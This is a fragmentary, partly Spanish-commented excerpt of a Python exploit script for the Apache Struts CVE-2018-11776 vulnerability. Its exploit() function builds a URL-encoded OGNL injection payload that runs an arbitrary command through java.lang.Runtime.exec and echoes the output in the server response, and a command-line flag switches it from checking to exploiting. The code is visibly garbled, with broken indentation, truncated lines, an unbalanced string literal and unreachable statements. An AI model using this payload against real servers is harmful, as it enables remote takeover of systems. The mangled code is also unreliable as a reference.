...
import sys
	...
	try:
		...
		parser.add_argument("--exploit", dest="do_exploit", help="Exploit.", action='store_true')
		...
		headers = {
			...
			(https://github.com/mazen160/struts-pwn_CVE-2018-11776)',AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0Safari/537.36','Accept': '*/*'
			}
...
"""
		...
		# url: http://Ejemplo.com/demo/struts2-showcase/index.action
		...
		url = url.replace(' ', '%20')
					...
					# Sitio: http://example.com

					site = scheme + '://' + urlparse.urlparse(url).netloc

					# PATH: /demo/struts2-showcase/index.action

					file_path = urlparse.urlparse(url).path
					if (file_path == ''):
						file_path = '/'

						# Nombre del Archivo: index.action

						try:
							filename = url.split('/')[-1]
						except IndexError:
							filename = ''
					#Directorio del archivo: /demo/struts2-showcase/
							...
							if not injection_entry.startswith("/"):
								injection_entry = "/%s" % (injection_entry)
									if not injection_entry.endswith("/"):
										...
										renderred later with the payload.
	...
	def exploit(url, cmd):
		...
		if injection_point is None:
			...
			return(0)
			print("[%] Exploiting...")
				payload =%24%7B%28%23_memberAccess%5B%22allowStaticMethodAccess%22%5D%3D
				true%2C%23a%3D@java.lang.Runtime@getRuntime%28%29.exec%28%27{0}%27
				%29.getInputStream%28%29%2C%23b%3Dnew%20java.io.InputStreamReader%
				28%23a%29%2C%23c%3Dnew%20%20java.io.BufferedReader%28%23b%29%2C%23
				d%3Dnew%20char%5B51020%5D%2C%23c.read%28%23d%29%2C%23sbtest%3D@org.apache.struts2.ServletActionContext@getResponse%28%29.getWriter%2
				8%29%2C%23sbtest.println%28%23d%29%2C%23sbtest.close%28%29%29%7D"".format(cmd)
			testing_url = "%s%s" % (parsed_url["site"], injection_point)
	...
	def main(url=url, usedlist=usedlist, cmd=cmd,
		...
		if url:
			if not do_exploit: check(url)
		else:
			exploit(url, cmd)
		if usedlist: URLs_List = []
			try:
				...
				try:
					...
					print("Error: There was an error in reading listfile.")
					print("Exception: " + str(e))
					exit(1)
